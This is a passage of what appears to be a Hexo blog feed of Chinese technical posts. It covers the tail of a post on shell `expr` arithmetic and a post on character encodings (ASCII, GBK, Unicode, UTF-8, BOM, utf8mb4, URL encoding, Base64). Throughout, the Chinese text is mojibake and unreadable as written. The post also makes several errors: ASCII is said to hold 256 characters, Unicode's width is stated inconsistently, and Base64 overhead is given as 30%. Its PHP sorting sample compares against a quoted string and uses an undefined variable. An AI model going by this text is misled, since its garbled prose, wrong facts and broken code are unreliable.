title="expr"></a>expr</h1><p>æ³¨æ„è¡¨è¾¾å¼ä¸¤ä¾§çš„ç©ºæ ¼ä¸è½¬ä¹‰å­—ç¬¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ expr 6 + 3    <span class="comment"># æ³¨æ„è¿ç®—ç¬¦ä¸¤ä¾§çš„ç©ºæ ¼</span></span><br><span class="line">$ expr 2 \* 3   <span class="comment"># æ³¨æ„è½¬ä¹‰å­—ç¬¦</span></span><br><span class="line">$ expr 14 % 9</span><br></pre></td></tr></table></figure><hr><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://www.cnblogs.com/kevingrace/p/6364307.html" target="_blank" rel="noopener">Linux ä¸‹è®¡ç®—å‘½ä»¤ï¼šæ±‚å’Œã€æ±‚å¹³å‡å€¼ã€æ±‚æœ€å€¼ - è¿ç»´ç¬”è®°</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºå¸¸ç”¨ç¼–ç çš„äºŒä¸‰äº‹</title>
      <link href="/post/computer-encoding/"/>
      <url>/post/computer-encoding/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaklaex35kj30go08c0u7.jpg" alt=""></p><a id="more"></a><h1 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h1><p>ç”¨1ä¸ªå­—èŠ‚è¡¨ç¤ºæ‰€æœ‰å­—ç¬¦ï¼Œå…±å¯ä»¥è¡¨ç¤º2^8=256 ä¸ªå­—ç¬¦ã€‚ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºæ—¶åªéœ€2ä½å³å¯è¡¨ç¤ºæ‰€æœ‰ASCIIå­—ç¬¦ã€‚ASCII è¡¨å‚è§<a href="https://blog.shixinyu.space/ASCII/">æ­¤å¤„</a></p><h1 id="ANSI"><a href="#ANSI" class="headerlink" title="ANSI"></a>ANSI</h1><p>åœ¨æ—©æœŸï¼Œä»¥è‹±è¯­ä¸ºä¸»çš„å›½å®¶ä½¿ç”¨ ASCII æ˜¯å®Œå…¨å¤Ÿç”¨çš„ï¼Œä½†éšç€è®¡ç®—æœºçš„æ™®åŠï¼ŒASCII å¯¹éè‹±è¯­å›½å®¶å°±æ˜¾å¾—æ‰è¥Ÿè§è‚˜äº†ï¼Œæ¯”å¦‚ä¸­å›½çš„æ±‰å­—å°±æœ‰æ•°ä¸‡ä¸ªï¼Œè€Œ ASCII æœ€å¤šåªèƒ½è¡¨ç¤º 256 ä¸ªï¼Œå› æ­¤å…¶ä»–å›½å®¶å¯¹ASCIIç¼–ç è¿›è¡Œæ‰©å±•ï¼Œç”¨äºæ˜¾ç¤ºæœ¬å›½çš„è¯­è¨€ï¼Œç”¨2ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œå…±å¯ä»¥è¡¨ç¤º2^16=65536ä¸ªå­—ç¬¦ã€‚</p><ul><li>ANSIåœ¨ç®€ä½“ä¸­æ–‡ä»£è¡¨GB2312ï¼Œç¹ä½“ä¸­æ–‡ä»£è¡¨BIG5ï¼Œæ—¥æ–‡ä»£è¡¨JIS</li><li>GB2312ä¸­å…±æ”¶å½•6763ä¸ªæ±‰å­—ã€‚ä¸­æ–‡é€šå¸¸æœ‰æ‹¼éŸ³å’Œç¬”ç”»ä¸¤ç§æ’åºæ–¹å¼ï¼ŒGB2312 ä¸­ï¼Œ3755 ä¸ªä¸€çº§ä¸­æ–‡æ±‰å­—æ˜¯æŒ‰ç…§æ‹¼éŸ³åºè¿›è¡Œç¼–ç çš„ï¼Œè€Œ 3008 ä¸ªäºŒçº§æ±‰å­—åˆ™æ˜¯æŒ‰éƒ¨é¦–ç¬”ç”»æ’åˆ—ï¼Œå› æ­¤å¹¶ä¸èƒ½æ ¹æ®å­—ç¬¦ç¼–ç è¿›è¡Œæ‹¼éŸ³æ’åºï¼Œå¾ˆå¤šèµ„æ–™éƒ½è¯´ GB2312(GBK) æ˜¯æŒ‰ç…§æ‹¼éŸ³æ’åºçš„ï¼Œå®é™…ä¸Šæ˜¯ä¸å‡†ç¡®çš„ï¼Œæ¯”å¦‚â€œèµµé’±å­™æä½˜â€æ’åºçš„ç»“æœæ˜¯â€œæé’±å­™èµµä½˜â€ï¼Œæ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„<sup>1</sup>ã€‚</li><li>GBKç¼–ç ï¼šå¯¹GB2312è¿›è¡Œæ‰©å……ï¼Œæ”¶å½•äº†ä¸€äº›ååƒ»å­—ã€å¤æ±‰å­—ç­‰ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name_list = [<span class="string">'èµµ'</span>,<span class="string">'é’±'</span>,<span class="string">'å­™'</span>,<span class="string">'æ'</span>,<span class="string">'ä½˜'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†å­—ç¬¦è½¬æ¢ä¸º GBK ç¼–ç </span></span><br><span class="line"><span class="keyword">foreach</span> ($name_list <span class="keyword">as</span> $key =&gt; $name)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'GBK'</span> !== <span class="string">'mb_detect_encoding($name)'</span>)&#123;</span><br><span class="line">        $outCharset[$key] = iconv($charset, <span class="string">'GBK'</span>, $name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŒ‰æ‹¼éŸ³æ’åº</span></span><br><span class="line">sort($outCharset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿˜åŸ UTF-8 ç¼–ç </span></span><br><span class="line"><span class="keyword">foreach</span> ($outCharset <span class="keyword">as</span> $key =&gt; $name)&#123;</span><br><span class="line">    $displayCharset[$key] = iconv(<span class="string">'GBK'</span>, <span class="string">'UTF-8'</span>, $name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print_r($displayCharset);</span><br></pre></td></tr></table></figure><p>åœ¨ PHP ä¸­ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ <code>(new \Collator(&#39;zh-CN&#39;))-&gt;asort($name_list);</code> å®ç°æŒ‰æ‹¼éŸ³æ’åº<sup>2</sup>ï¼Œå‰ææ˜¯ä½ å¯ä»¥æ­£å¸¸å®‰è£… intlï¼Œæˆ‘é€šè¿‡<code>sudo pecl install intl</code>æŠ˜è…¾äº†åŠå¤©ï¼Œæ€»æ˜¯æŠ¥é”™<code>ERROR: /private/tmp/pear/temp/intl/configure --with-php-config=/usr/local/opt/php/bin/php-config --with-icu-dir=DEFAULT&#39; failed</code>ï¼Œæˆ‘ç”¨ pecl å¥½åƒå°±ä»æ¥æ²¡æœ‰å®‰è£…æˆåŠŸè¿‡ä¸œè¥¿:(</p><h1 id="Unicode-å­—ç¬¦é›†"><a href="#Unicode-å­—ç¬¦é›†" class="headerlink" title="Unicode å­—ç¬¦é›†"></a>Unicode å­—ç¬¦é›†</h1><p>ç”±äºå„å›½éƒ½åˆ¶å®šäº†è‡ªå·±çš„ç¼–ç ï¼Œå¯¼è‡´äº†ç¾¤é›„å‰²æ®çš„å±€é¢ï¼Œå¾ˆä¸åˆ©äºä¼ æ’­ä¸ä½¿ç”¨ï¼Œå°±åœ¨æ­¤æ—¶ï¼ŒUnicode ç«™äº†å‡ºæ¥ï¼Œè®¡åˆ’å°†ä¸–ç•Œä¸Šæ‰€æœ‰å­—ç¬¦ç»Ÿä¸€ç¼–ç ï¼Œç”¨4ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æ±‰å­—çš„â€œå¥½â€Unicode ç¼–ç ä¸º<code>\u597d</code>ï¼Œè‹±æ–‡çš„å­—æ¯â€œHâ€ç¼–ç ä¸º<code>\u0048</code>ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaox3jjum2j307y0c7dh9.jpg" alt=""></p><p>è¿™æ ·ï¼Œæ‰€æœ‰å­—ç¬¦éƒ½å¯ä»¥ä»¥ç»Ÿä¸€çš„æ ‡å‡†è¿›è¡Œç®¡ç†å’Œè¡¨ç¤ºäº†ï¼Œå› æ­¤è¿…é€Ÿå¾—åˆ°äº†Adobeã€Appleã€HPã€IBMã€Microsoft ç­‰å·¨å¤´çš„æ”¯æŒï¼Œå¹¶é£é¡å…¨çƒã€‚ç›®å‰æœ€æ–°çš„ç‰ˆæœ¬ä¸º 2019 å¹´ 5 æœˆå…¬å¸ƒçš„ 12.1.0ï¼Œå·²ç»æ”¶å½•è¶…è¿‡ 13 ä¸‡ä¸ªå­—ç¬¦ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åœ¨<a href="http://www.chi2ko.com/tool/CJK.htm" target="_blank" rel="noopener">å­—ä½“ç¼–è¾‘ç”¨ä¸­æ—¥éŸ©æ±‰å­— Unicode ç¼–ç è¡¨</a>æŸ¥çœ‹åˆ° Unicode çš„ 16 è¿›åˆ¶è¡¨ç¤ºã€‚</p><h2 id="UTF-8-ç¼–ç "><a href="#UTF-8-ç¼–ç " class="headerlink" title="UTF-8 ç¼–ç "></a>UTF-8 ç¼–ç </h2><p>ä½ ä»¥ä¸ºäº†æœ‰äº†Unicodeå°±ä¸–ç•Œå’Œå¹³äº†ï¼ŸToo young, too simple!</p><p>Unicode è™½ç„¶ç»“æŸäº†å„å›½ç¼–ç æ··æˆ˜çš„å±€é¢ï¼Œä½†ä¸€ä¸ªè‹±æ–‡å­—ç¬¦ä¹Ÿè¦ä¸ºäº†ç¬¦åˆæ ‡å‡†è€Œå¼ºè¡Œç”¨ä¸¤ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œè¿™å°±å¯¼è‡´æµªè´¹äº†ä¸€ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œå°† 16 è¿›åˆ¶çš„ Unicode ç è½¬æ¢æˆäºŒè¿›åˆ¶å¾—ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">01011001 </span><span class="number">01111101</span> // å¥½</span><br><span class="line"><span class="symbol">00000000 </span><span class="number">01001000</span> // H</span><br></pre></td></tr></table></figure><p>è‹±æ–‡å­—ç¬¦åœ¨ Unicode ä¸­çš„æ¯ä¸ªå­—ç¬¦éƒ½è¦æµªè´¹ 1 ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œè¿™é€ æˆäº†ç¡¬ç›˜å­˜å‚¨äºå¸¦å®½æµé‡çš„å·¨å¤§æµªè´¹ï¼Œå› æ­¤ï¼ŒUTF-8 æ¨ªç©ºå‡ºä¸–ï¼</p><p>é‚£ä¹ˆï¼ŒUTF-8æ˜¯å¦‚ä½•å¹³è¡¡ç»Ÿä¸€ä¸ç©ºé—´å‘¢ï¼Ÿ</p><ol><li>å•å­—èŠ‚çš„å­—ç¬¦ï¼Œå­—èŠ‚çš„é¦–ä½è®¾ä¸º 0ï¼Œå¯¹äºè‹±è¯­æ–‡æœ¬ï¼ŒUTF-8 ç åªå ç”¨ä¸€ä¸ªå­—èŠ‚ï¼Œä¸ ASCII ç å®Œå…¨ç›¸åŒï¼ˆASCII æœ€å¤§å€¼æ˜¯<code>0111 1111</code>ï¼Œå› æ­¤é¦–ä½å¿…ç„¶æ˜¯ 0ï¼Œä¹Ÿå°±ä¸ ASCII å®Œå…¨ç›¸åŒï¼‰</li><li>n ä¸ªå­—èŠ‚çš„å­—ç¬¦ (n&gt;1)ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚çš„å‰ n ä½è®¾ä¸º 1ï¼ˆç¤ºä¾‹ä¸­çš„è“è‰²ï¼‰ï¼Œç¬¬ n+1 ä½è®¾ä¸º 0ï¼ˆç¤ºä¾‹ä¸­çš„é»‘è‰²ï¼‰ï¼Œåé¢å­—èŠ‚çš„å‰ä¸¤ä½éƒ½è®¾ä¸º 10ï¼Œè¿™ n ä¸ªå­—èŠ‚çš„å…¶ä½™ç©ºä½å¡«å……è¯¥å­—ç¬¦ Unicode ç ï¼Œé«˜ä½ç”¨ 0 è¡¥è¶³ï¼ˆç¤ºä¾‹ä¸­çš„çº¢è‰²ï¼‰ã€‚</li></ol><table><thead><tr><th>å­—ç¬¦æ‰€å å­—èŠ‚æ•°</th><th>å­—èŠ‚ç çš„æœ‰æ•ˆä½æ•°</th><th>èµ·å§‹å­—èŠ‚ç </th><th>æœ«ä½å­—èŠ‚ç </th><th>Byte 1</th><th>Byte 2</th><th>Byte 3</th><th>Byte 4</th></tr></thead><tbody><tr><td>1</td><td>7</td><td>U+0000</td><td>U+007F</td><td>0bbbbbbb</td><td></td><td></td><td></td></tr><tr><td>2</td><td>11</td><td>U+0080</td><td>U+07FF</td><td>110bbbbb</td><td>10bbbbbb</td><td></td><td></td></tr><tr><td>3</td><td>16</td><td>U+0800</td><td>U+FFFF</td><td>1110bbbb</td><td>10bbbbbb</td><td>10bbbbbb</td><td></td></tr><tr><td>4</td><td>21</td><td>U+10000</td><td>U+10FFFF</td><td>11110bbb</td><td>10bbbbbb</td><td>10bbbbbb</td><td>10bbbbbb</td></tr></tbody></table><p>æ˜ç™½äº† UTF-8 çš„è§„åˆ™ï¼Œæˆ‘ä»¬å†çœ‹ä¸‹æ±‰å­—â€œå¥½â€çš„ UTF8 è¡¨ç¤ºï¼š<font color="blue">111</font><font color="black">0</font><font color="red">0101</font> <font color="blue">10</font><font color="red">100101</font> <font color="blue">10</font><font color="red">111101</font></p><p>æ ¹æ® Wikipedia çš„<a href="https://en.wikipedia.org/wiki/UTF-8" target="_blank" rel="noopener">UTF8å®šä¹‰</a>ï¼ŒUTF-8(8-bit Unicode Transformation Format)æ˜¯ä¸€ç§å¯å®¹çº³1,112,064ä¸ªUnicodeç ä½çš„å˜é•¿å­—ç¬¦ç¼–ç ï¼Œæ¯ä¸ªå­—ç¬¦ä¼šå ç”¨ 1~4 ä¸ªå­—èŠ‚ã€‚é€šè¿‡å…¶å®šä¹‰ï¼Œæˆ‘ä»¬æ˜ç™½ UTF-8 å°±æ˜¯ Unicode çš„ä¸€ç§è½¬æ¢æ ¼å¼ï¼Œé€šè¿‡æ ‡è®°ä½å’Œ Unicode ç ä½å°† Unicode è¿›è¡Œè½¬æ¢ã€‚</p><p>æ˜ç™½äº† Unicode ä¸ UTF-8ï¼Œå°±èƒ½ç†è§£ä¸ºä»€ä¹ˆç»å¤§å¤šæ•°çš„ä»£ç éƒ½æ˜¯ä»¥ UTF-8 ç¼–ç ï¼Œå› ä¸º UTF-8 èƒ½å…¼å®¹ç»å¤§å¤šæ•°çš„è¯­è¨€ï¼Œé€šç”¨æ€§éå¸¸å¥½ï¼Œè€Œä»£ç ç»å¤§éƒ¨åˆ†åˆæ˜¯è‹±æ–‡å­—ç¬¦ï¼Œå› æ­¤è¾¾åˆ°äº†é€šç”¨æ€§ä¸ç©ºé—´çš„ç»å¦™å¹³è¡¡ã€‚å¦‚æœè¦å‚¨å­˜ä¸€æœ¬ã€Šçº¢æ¥¼æ¢¦ã€‹ï¼Œä½¿ç”¨ Unicode æ˜¯æ›´æ˜æ™ºçš„é€‰æ‹©ï¼Œå®ƒä¸ä»…åŒ…å«äº†ç»å¤§å¤šæ•°çš„æ±‰å­—ï¼Œä¹Ÿä½¿å¾—æ¯ä¸ªæ±‰å­—ä»¥ 2 å­—èŠ‚å­˜å‚¨ï¼Œè¾¾åˆ°å…¼å®¹ä¸ç©ºé—´çš„å¹³è¡¡ã€‚</p><h3 id="UFT-8-with-BOM-å’Œ-UFT-8-without-BOM"><a href="#UFT-8-with-BOM-å’Œ-UFT-8-without-BOM" class="headerlink" title="UFT-8 with BOM å’Œ UFT-8 without BOM"></a>UFT-8 with BOM å’Œ UFT-8 without BOM</h3><p>UTF-8 ä¸éœ€è¦ BOMï¼Œå°½ç®¡ Unicode æ ‡å‡†å…è®¸åœ¨ UTF-8 ä¸­ä½¿ç”¨ BOMã€‚æ‰€ä»¥ä¸å« BOM çš„ UTF-8 æ‰æ˜¯æ ‡å‡†å½¢å¼ï¼Œåœ¨ UTF-8 æ–‡ä»¶ä¸­æ”¾ç½® BOM ä¸»è¦æ˜¯å¾®è½¯çš„ä¹ æƒ¯ï¼ˆé¡ºä¾¿æä¸€ä¸‹ï¼šæŠŠå¸¦æœ‰ BOM çš„å°ç«¯åº UTF-16 ç§°ä½œã€ŒUnicodeã€è€Œåˆä¸è¯¦ç»†è¯´æ˜ï¼Œè¿™ä¹Ÿæ˜¯å¾®è½¯çš„ä¹ æƒ¯ï¼‰ã€‚BOMï¼ˆbyte order markï¼‰æ˜¯ä¸º UTF-16 å’Œ UTF-32 å‡†å¤‡çš„ï¼Œç”¨äºæ ‡è®°å­—èŠ‚åºï¼ˆbyte orderï¼‰ã€‚å¾®è½¯åœ¨ UTF-8 ä¸­ä½¿ç”¨ BOM æ˜¯å› ä¸ºè¿™æ ·å¯ä»¥æŠŠ UTF-8 å’Œ ASCII ç­‰ç¼–ç æ˜ç¡®åŒºåˆ†å¼€ï¼Œä½†è¿™æ ·çš„æ–‡ä»¶åœ¨ Windows ä¹‹å¤–çš„æ“ä½œç³»ç»Ÿé‡Œä¼šå¸¦æ¥é—®é¢˜ã€‚ã€ŒUTF-8ã€å’Œã€Œå¸¦ BOM çš„ UTF-8ã€çš„åŒºåˆ«å°±æ˜¯æœ‰æ²¡æœ‰ BOMã€‚å³æ–‡ä»¶å¼€å¤´æœ‰æ²¡æœ‰ U+FEFFã€‚</p><blockquote><p>æ¥è‡ª<a href="https://www.zhihu.com/question/20167122/answer/14194448" target="_blank" rel="noopener">ã€Œå¸¦ BOM çš„ UTF-8ã€å’Œã€Œæ—  BOM çš„ UTF-8ã€æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ - æ¢æµ·çš„å›ç­”</a></p></blockquote><p>ä½†æ˜¯ï¼Œæ–‡å­—æœ‰ GBKã€UTF-8ã€UFT-16 ç­‰å¤šç§ç¼–ç æ–¹å¼ï¼Œå½“æˆ‘ä»¬å°†ç¼–å†™å¥½çš„æ–‡ä»¶å­˜å‚¨å¹¶å‘é€ç»™å…¶ä»–äººï¼Œè®¡ç®—æœºè¯†åˆ«çš„éƒ½æ˜¯äºŒè¿›åˆ¶å•Šï¼Œå®ƒæ€ä¹ˆçŸ¥é“å“ªäº›æ˜¯æ ‡å¿—ä½ï¼Œå“ªäº›æ˜¯å­—ç¬¦ä½å‘¢ï¼Ÿå› æ­¤ï¼Œæˆ‘ä»¬åœ¨ç¼–å†™æ–‡ä»¶æ—¶ï¼Œéœ€è¦å°†è¯¥æ–‡ä»¶çš„ç¼–ç ç±»å‹ä¸€åŒå†™å…¥æ–‡ä»¶ï¼Œè¿™æ ·åœ¨è§£è¯»æ–‡ä»¶å†…å®¹æ—¶ï¼ŒæŒ‰ç…§å¯¹åº”çš„è§„åˆ™è§£è¯»å°±å¯ä»¥è¿˜åŸäº†ï¼Œå…·ä½“å¯é˜…è¯»ä¹‹å‰çš„æ–‡ç« <a href="https://blog.shixinyu.space/post/how-computers-store-and-interpret-files/">è®¡ç®—æœºæ˜¯å¦‚ä½•å­˜å‚¨ä¸è§£è¯»å„ç§æ–‡ä»¶çš„</a>ã€‚</p><h2 id="UTF8MB4"><a href="#UTF8MB4" class="headerlink" title="UTF8MB4"></a>UTF8MB4</h2><p>å¦‚ä»Šï¼ŒEmoji è¡¨æƒ…å·²ç»æˆä¸ºç¤¾äº¤ä¸­æœ€å¸¸ç”¨çš„ç¬¦å·ğŸ˜‚ï¼Œå¦‚æœæˆ‘ä»¬é‡‡ç”¨ UTF-8 å­˜å‚¨ Emojiï¼Œåˆ™ä¼šå¯¼è‡´æº¢å‡ºé—®é¢˜ï¼Œå› æ­¤ MySQL &lt;= 5.7 å­˜å‚¨ Emoji éœ€æ‰‹åŠ¨å°†ç¼–ç è®¾ç½®ä¸º Emojiï¼ŒMySQL 8.0+ åˆ™é»˜è®¤ä¸º UTF8MB4 ç¼–ç ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åœ¨<a href="https://getemoji.com/" target="_blank" rel="noopener">è¿™é‡Œ</a>æŸ¥è¯¢åˆ°å¸¸ç”¨çš„ Emoji ğŸ¤—</p><h1 id="URL-ç¼–ç "><a href="#URL-ç¼–ç " class="headerlink" title="URL ç¼–ç "></a>URL ç¼–ç </h1><p>URL ç¼–ç åŒæ ·æ˜¯ä¸ºäº†å°† URL ä¸­çš„é ASCII å­—ç¬¦è½¬æ¢ä¸º ASCII å­—ç¬¦ä¼ è¾“ï¼ŒURL ç¼–ç ä¹Ÿæ˜¯ ASCII ç¼–ç ï¼Œå¦‚ç©ºæ ¼çš„ URL ç¼–ç ä¸º<code>%20</code>ï¼Œç©ºæ ¼åœ¨ ASCII ä¸­çš„åå…­è¿›åˆ¶è¡¨ç¤ºä¹Ÿæ˜¯<code>20</code>ã€‚å…¶ä¿ç•™å­—ç¬¦çš„ç™¾åˆ†å·ç¼–ç å¦‚ä¸‹ï¼š</p><table><thead><tr><th><code></code></th><th><code>!</code></th><th><code>#</code></th><th><code>$</code></th><th><code>%</code></th><th><code>&amp;</code></th><th><code>&#39;</code></th><th><code>(</code></th><th><code>)</code></th><th><code>*</code></th><th><code>+</code></th><th><code>,</code></th><th><code>/</code></th><th><code>:</code></th><th><code>;</code></th><th><code>=</code></th><th><code>?</code></th><th><code>@</code></th><th><code>[</code></th><th><code>]</code></th></tr></thead><tbody><tr><td>%20</td><td>%21</td><td>%23</td><td>%24</td><td>%25</td><td>%26</td><td>%27</td><td>%28</td><td>%29</td><td>%2A</td><td>%2B</td><td>%2C</td><td>%2F</td><td>%3A</td><td>%3B</td><td>%3D</td><td>%3F</td><td>%40</td><td>%5B</td><td>%5D</td></tr></tbody></table><p>æ ¹æ®æœ€æ–°çš„RFC 3986æ ‡å‡†ï¼Œé ASCII å­—ç¬¦å»ºè®®å…ˆè½¬æ¢ä¸º UTF-8 å­—èŠ‚åºåˆ—ï¼Œç„¶åå¯¹å…¶å­—èŠ‚å€¼ä½¿ç”¨ç™¾åˆ†å·ç¼–ç ã€‚å› æ­¤ï¼Œæ±‰å­—â€œå¥½â€çš„ UTF-8 ç¼–ç ä¸º<code>E5A5BD</code>ï¼ŒURL ç¼–ç ä¸º<code>%E5%A5%BD</code>ã€‚</p><p>å¦å¤–æ—©æœŸçš„ URL ç¼–ç è§„åˆ™ä¼šå°†ç©ºæ ¼ç¼–ç ä¸º<code>+</code>ï¼Œè€Œç°åœ¨ä¼šå¤„ç†ä¸º<code>%20</code>ï¼ŒPHP ä¸­åˆ™åˆ†åˆ«å¯¹åº”å¤„ç†å‡½æ•°<code>urlencode()</code>ä¸<code>rawurlencode()</code>ã€‚</p><p>å…³äº URL ç¼–ç çš„å†å²è¯¾æŸ¥çœ‹é˜®ä¸€å³°è€å¸ˆäºåå¹´å‰æ‰€å†™çš„æ–‡ç« <a href="https://www.ruanyifeng.com/blog/2010/02/url_encoding.html" target="_blank" rel="noopener">å…³äº URL ç¼–ç </a></p><h1 id="Base64-ç¼–ç "><a href="#Base64-ç¼–ç " class="headerlink" title="Base64 ç¼–ç "></a>Base64 ç¼–ç </h1><p>é¡¾åæ€ä¹‰ï¼ŒBase64 æ˜¯ä¸€ç§åŸºäº 64 ä¸ªå¯æ‰“å°å­—ç¬¦ï¼ˆ<code>A~Z</code>ã€<code>a~z</code>ã€<code>0~9</code>ã€<code>+</code>ã€<code>/</code>ï¼‰æ¥è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®çš„è¡¨ç¤ºæ–¹æ³•ã€‚ç”±äº2^6=64ï¼Œæ‰€ä»¥æ¯ 6 ä¸ªä½ä¸ºä¸€ç»„ï¼Œå¯¹åº”æŸä¸ªå¯æ‰“å°å­—ç¬¦ã€‚å®Œæ•´çš„ Base64 å®šä¹‰å¯è§ <a href="https://tools.ietf.org/html/rfc1424" target="_blank" rel="noopener">RFC 1421</a> å’Œ <a href="https://tools.ietf.org/html/rfc2045" target="_blank" rel="noopener">RFC 2045</a>ã€‚ç”±äºç°åœ¨éœ€è¦ 6bit è¡¨ç¤ºåŸæœ¬ç”¨ 8bit è¡¨ç¤ºçš„ 1 ä¸ªå­—èŠ‚ï¼Œå› æ­¤ç¼–ç åçš„æ•°æ®æ¯”åŸå§‹æ•°æ®å¤§ 30%ã€‚</p><p>æœ€åˆçš„ç”µå­é‚®ä»¶åªèƒ½ä½¿ç”¨ ASCII å­—ç¬¦ï¼Œå› æ­¤ Base64 çš„å‘æ˜å°±è¢«ç”¨äºå°†å›¾ç‰‡æˆ–é ASCII å­—ç¬¦è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚å…¶å­—ç¬¦åˆ—è¡¨å¦‚ä¸‹ï¼š</p><table><thead><tr><th>æ•°å€¼</th><th>å­—ç¬¦</th><th>æ•°å€¼</th><th>å­—ç¬¦</th><th>æ•°å€¼</th><th>å­—ç¬¦</th><th>æ•°å€¼</th><th>å­—ç¬¦</th></tr></thead><tbody><tr><td>0</td><td>A</td><td>16</td><td>Q</td><td>32</td><td>g</td><td>48</td><td>w</td></tr><tr><td>1</td><td>B</td><td>17</td><td>R</td><td>33</td><td>h</td><td>49</td><td>x</td></tr><tr><td>2</td><td>C</td><td>18</td><td>S</td><td>34</td><td>i</td><td>50</td><td>y</td></tr><tr><td>3</td><td>D</td><td>19</td><td>T</td><td>35</td><td>j</td><td>51</td><td>z</td></tr><tr><td>4</td><td>E</td><td>20</td><td>U</td><td>36</td><td>k</td><td>52</td><td>0</td></tr><tr><td>5</td><td>F</td><td>21</td><td>V</td><td>37</td><td>l</td><td>53</td><td>1</td></tr><tr><td>6</td><td>G</td><td>22</td><td>W</td><td>38</td><td>m</td><td>54</td><td>2</td></tr><tr><td>7</td><td>H</td><td>23</td><td>X</td><td>39</td><td>n</td><td>55</td><td>3</td></tr><tr><td>8</td><td>I</td><td>24</td><td>Y</td><td>40</td><td>o</td><td>56</td><td>4</td></tr><tr><td>9</td><td>J</td><td>25</td><td>Z</td><td>41</td><td>p</td><td>57</td><td>5</td></tr><tr><td>10</td><td>K</td><td>26</td><td>a</td><td>42</td><td>q</td><td>58</td><td>6</td></tr><tr><td>11</td><td>L</td><td>27</td><td>b</td><td>43</td><td>r</td><td>59</td><td>7</td></tr><tr><td>12</td><td>M</td><td>28</td><td>c</td><td>44</td><td>s</td><td>60</td><td>8</td></tr><tr><td>13</td><td>N</td><td>29</td><td>d</td><td>45</td><td>t</td><td>61</td><td>9</td></tr><tr><td>14</td><td>O</td><td>30</td><td>e</td><td>46</td><td>u</td><td>62</td><td>+</td></tr><tr><td>15</td><td>P</td><td>31</td><td>f</td><td>47</td><td>v</td><td>63</td><td>/</td></tr></tbody></table><h2 id="ç¼–ç ç¤ºä¾‹"><a href="#ç¼–ç ç¤ºä¾‹" class="headerlink" title="ç¼–ç ç¤ºä¾‹"></a>ç¼–ç ç¤ºä¾‹</h2><p>æˆ‘ä»¬å·²ç»äº†è§£äº† Base64 çš„ç¼–ç è§„åˆ™ï¼Œç°åœ¨å°±æ¥å¾’æ‰‹ç¼–ç å­—ç¬¦<code>Man</code>ã€‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gapdwcowuzj30z40a0q3i.jpg" alt=""></p><p>æ±‰å­—æœ¬èº«å¯ä»¥æœ‰å¤šç§ç¼–ç ï¼Œæ¯”å¦‚ GB2312ã€UTF-8ã€GBK ç­‰ç­‰ï¼Œæ¯ä¸€ç§ç¼–ç çš„ Base64 å¯¹åº”å€¼éƒ½ä¸ä¸€æ ·ã€‚æˆ‘ä»¬ä»¥UTF-8ç¼–ç çš„æ±‰å­—â€œå¥½â€ï¼ˆå…¶åå…­è¿›åˆ¶ä¸º<code>597D</code>ï¼‰ä¸ºä¾‹ï¼š<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gapec9ox9ej31kk09wgmi.jpg" alt=""></p><p>ä½ å¯èƒ½ä¼šæ³¨æ„åˆ°ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šåœ¨ Base64 ç¼–ç ä¸­å‘ç°æœ‰<code>=</code>å­—ç¬¦ï¼Œæ¯”å¦‚<code>moky</code>çš„ Base64 ç¼–ç ä¸º<code>bW9reQ==</code>ï¼Œè€Œ<code>=</code>å´æ²¡æœ‰å‡ºç°åœ¨å­—ç¬¦åˆ—è¡¨ä¸­ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºBase64æœ«ä½çš„<code>=</code>ä»…ä»…æ˜¯ä¸ºäº†ä»£è¡¨è¡¥è¶³çš„å­—èŠ‚æ•°ï¼Œæ¯ä¸ª<code>=</code>ä»£è¡¨äº† 2bitã€‚å¦‚æœæˆ‘ä»¬ä»…è§£ç <code>bW9reQ</code>ï¼ŒåŒæ 